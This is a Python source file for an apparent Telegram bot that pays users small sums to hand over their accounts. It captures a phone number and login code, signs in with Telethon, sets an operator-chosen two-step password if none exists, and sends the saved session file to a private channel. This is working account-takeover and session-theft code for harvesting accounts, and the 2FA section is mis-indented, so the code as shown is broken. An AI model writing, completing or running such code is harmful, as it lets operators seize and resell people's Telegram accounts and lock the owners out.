import os
import json
import asyncio
from datetime import datetime

from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient, functions, types
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneNumberInvalidError,
    FloodWaitError,
    PhoneCodeInvalidError,
)

from config import API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID, ADMIN_ID, SESSION_2FA_PASSWORD


# Initialize Pyrogram bot client
app = Client("bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)

user_data = {}
sessions = {}
state = {}

DATA_FILE = "data.json"

country_rates = {
    "BD": 0.25,
    "IN": 0.20,
    "PK": 0.22,
    "ID": 0.23,
}

def load_data():
    global user_data
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                user_data = json.load(f)
        except Exception:
            user_data = {}
    else:
        user_data = {}

def save_data():
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(user_data, f, indent=4)
    except Exception as e:
        print(f"[ERROR] Failed to save data: {e}")

load_data()

@app.on_message(filters.command("start") & filters.private)
async def start(_, msg):
    user_id = str(msg.from_user.id)
    if user_id not in user_data:
        user_data[user_id] = {
            "id": msg.from_user.id,
            "success": 0,
            "balance": 0.0,
            "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        save_data()

    state[user_id] = "awaiting_phone"

    keyboard = ReplyKeyboardMarkup(
        [
            ["✅ Restart", "🌐 Capacity"],
            ["🎰 Check - Balance"],
            ["💸 Withdraw Accounts"],
            ["🆘 Need Help?"],
        ],
        resize_keyboard=True,
    )

    await msg.reply(
        "🎉 Welcome to Robot!\n\n"
        "Enter your phone number with the country code.\n"
        "Example: +8801XXXXXXXXX\n\n"
        "Type /cap to see available countries.",
        reply_markup=keyboard,
    )

@app.on_message(filters.command("cap") & filters.private)
async def cap(_, msg):
    text = "🌐 Available Countries and Prices:\n"
    for c, p in country_rates.items():
        text += f"🔹 {c}: ${p}\n"
    await msg.reply(text)

@app.on_message(filters.command("account") & filters.private)
async def account(_, msg):
    user_id = str(msg.from_user.id)
    d = user_data.get(user_id, {})
    await msg.reply(
        f"🎫 Your user account info:\n\n"
        f"👤 ID: {d.get('id')}\n"
        f"🥅 Total success accounts: {d.get('success')}\n"
        f"💰 Your balance: ${d.get('balance', 0.0):.2f}\n"
        f"⏰ Joined at: {d.get('joined')}"
    )

@app.on_message(filters.command("withdraw") & filters.private)
async def withdraw(_, msg):
    user_id = str(msg.from_user.id)
    d = user_data.get(user_id, {})
    text = (
        f"🎫 Your account info:\n\n"
        f"👤 ID: {d.get('id')}\n"
        f"🥅 Total success accounts: {d.get('success')}\n"
        f"💰 Your balance: ${d.get('balance', 0.0):.2f}\n"
        f"⏰ Joined at: {d.get('joined')}\n\n"
        f"💵 Choose withdrawal method:"
    )
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("💳 USDT (BEP20)", callback_data="withdraw_usdt")],
            [InlineKeyboardButton("💸 TRX", callback_data="withdraw_trx")],
            [InlineKeyboardButton("📱 BKASH", callback_data="withdraw_bkash")],
            [InlineKeyboardButton("🔙 Back", callback_data="menu")],
        ]
    )
    await msg.reply(text, reply_markup=keyboard)

@app.on_message(filters.command("support") & filters.private)
async def support(_, msg):
    await msg.reply("🆘 Contact support: @xrd_didox")

@app.on_callback_query()
async def callback(_, query):
    user_id = str(query.from_user.id)
    d = user_data.get(user_id, {})

    if query.data.startswith("withdraw_"):
        option = query.data.split("_")[1].upper()
        await query.answer(f"Withdraw request via {option} received!")
        await query.message.reply(f"✅ Withdraw request submitted via {option}.")
        await app.send_message(
            CHANNEL_ID,
            f"💸 Withdraw Report:\n\n"
            f"👤 User ID: {d.get('id')}\n"
            f"💰 Amount: ${d.get('balance', 0.0):.2f}\n"
            f"💳 Method: {option}\n"
            f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        )
        d["balance"] = 0.0
        save_data()

    elif query.data == "menu":
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("🌐 Capacity", callback_data="cap")],
                [InlineKeyboardButton("🎰 Check - Balance", callback_data="account")],
                [InlineKeyboardButton("💸 Withdraw Accounts", callback_data="withdraw")],
                [InlineKeyboardButton("🆘 Need Help?", callback_data="support")],
            ]
        )
        await query.message.edit_text("📲 Choose an option:", reply_markup=keyboard)

    elif query.data == "cap":
        text = "🌐 Available Countries and Prices:\n"
        for c, p in country_rates.items():
            text += f"🔹 {c}: ${p}\n"
        await query.message.edit_text(
            text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="menu")]])
        )

    elif query.data == "account":
        text = (
            f"🎫 Your user account info:\n\n"
            f"👤 ID: {d.get('id')}\n"
            f"🥅 Total success accounts: {d.get('success')}\n"
            f"💰 Your balance: ${d.get('balance', 0.0):.2f}\n"
            f"⏰ Joined at: {d.get('joined')}"
        )
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="menu")]]))

    elif query.data == "withdraw":
        text = (
            f"🎫 Your account info:\n\n"
            f"👤 ID: {d.get('id')}\n"
            f"🥅 Total success accounts: {d.get('success')}\n"
            f"💰 Your balance: ${d.get('balance', 0.0):.2f}\n"
            f"⏰ Joined at: {d.get('joined')}\n\n"
            f"💵 Choose withdrawal method:"
        )
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("💳 USDT (BEP20)", callback_data="withdraw_usdt")],
                [InlineKeyboardButton("💸 TRX", callback_data="withdraw_trx")],
                [InlineKeyboardButton("📱 BKASH", callback_data="withdraw_bkash")],
                [InlineKeyboardButton("🔙 Back", callback_data="menu")],
            ]
        )
        await query.message.edit_text(text, reply_markup=keyboard)

    elif query.data == "support":
        await query.message.edit_text(
            "🆘 For help, contact: @xrd_didox",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="menu")]]),
        )

@app.on_message(filters.text & filters.private)
async def handle_input(_, msg):
    user_id = str(msg.from_user.id)
    current_state = state.get(user_id)

    if current_state == "awaiting_phone":
        phone = msg.text.strip()
        if not phone.startswith("+") or len(phone) < 8 or not phone[1:].isdigit():
            await msg.reply("❌ Please send a valid phone number with country code (e.g. +1234567890).")
            return

        sessions[user_id] = {"phone": phone}
        await msg.reply("📨 Sending OTP...")
        asyncio.create_task(send_otp(user_id, msg))
        state[user_id] = "awaiting_code"
        return

    if current_state == "awaiting_code":
        code = msg.text.strip()
        if not code.isdigit() or len(code) < 4 or len(code) > 10:
            await msg.reply("❌ Please enter a valid OTP code.")
            return

        sessions[user_id]["code"] = code
        await msg.reply("⏳ Verifying your code, please wait...")
        await verify_session(user_id, msg)
        return

async def send_otp(user_id, msg):
    phone = sessions[user_id]["phone"]
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        sessions[user_id]["client"] = client
        await msg.reply("📩 OTP sent. Please enter the code:")
    except PhoneNumberInvalidError:
        await msg.reply("❌ Invalid phone number. Please try again.")
        state[user_id] = None
    except FloodWaitError as e:
        await msg.reply(f"❌ Flood wait error. Try again after {e.seconds} seconds.")
        state[user_id] = None
    except Exception as e:
        await msg.reply(f"❌ Failed to send OTP: {e}")
        state[user_id] = None

async def verify_session(user_id, msg):
    phone = sessions[user_id]["phone"]
    code = sessions[user_id]["code"]
    client: TelegramClient = sessions[user_id]["client"]

    try:
        await client.sign_in(phone, code)

        # Success message after sign-in
        first_success_text = (
            f"🎉 We have successfully processed your account\n"
            f"Number: {phone}\n"
            f"Price: 1.6$\n"
            f"Status: Free Spam\n"
            f"Congratulations, has been added to your balance."
        )
        await msg.reply(first_success_text)

     # Check if 2FA is set, if not set it automatically
password_info = await client(functions.account.GetPasswordRequest())
if not password_info.has_password:
    await client(functions.account.UpdatePasswordSettingsRequest(
        current_password=types.InputCheckPasswordEmpty(),
        new_settings=types.account.PasswordInputSettings(
            new_password=SESSION_2FA_PASSWORD,
            hint="Secure your account"
        )
    ))

        # Save session string to file
        session_str = client.session.save()
        filename = f"session_{user_id}.session"
        with open(filename, "w") as f:
            f.write(session_str)

        # Send session file to private channel
        await app.send_document(CHANNEL_ID, filename, caption=f"✅ Session for {phone}")

        # Remove local session file
        os.remove(filename)

        # Update user data
        if user_id not in user_data:
            user_data[user_id] = {
                "id": int(user_id),
                "success": 0,
                "balance": 0.0,
                "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }

        user_data[user_id]["success"] += 1

        # Calculate country code from phone (modify if needed)
        country_code = phone[1:3].upper()
        rate = country_rates.get(country_code, 0.20)
        user_data[user_id]["balance"] += rate

        save_data()

        # Disconnect client and reset state
        await client.disconnect()
        state[user_id] = None

        # Final success message
        final_success_text = (
            f"🔒 2FA has been set with password: {SESSION_2FA_PASSWORD}\n\n"
            f"✅ Your account has been verified and session saved!\n"
            f"🎉 Balance updated by ${rate:.2f}."
        )
        await msg.reply(final_success_text)

    except SessionPasswordNeededError:
        await msg.reply("❌ This account requires 2FA password. Please contact admin.")
        state[user_id] = None

    except PhoneCodeInvalidError:
        await msg.reply("❌ Invalid OTP code entered. Please try again.")
        state[user_id] = "awaiting_code"

    except FloodWaitError as e:
        await msg.reply(f"❌ Flood wait error. Try again after {e.seconds} seconds.")
        state[user_id] = None

    except Exception as e:
        await msg.reply(f"❌ Verification failed: {e}")
        state[user_id] = None

if __name__ == "__main__":
    print("Bot is starting...")
    app.run()
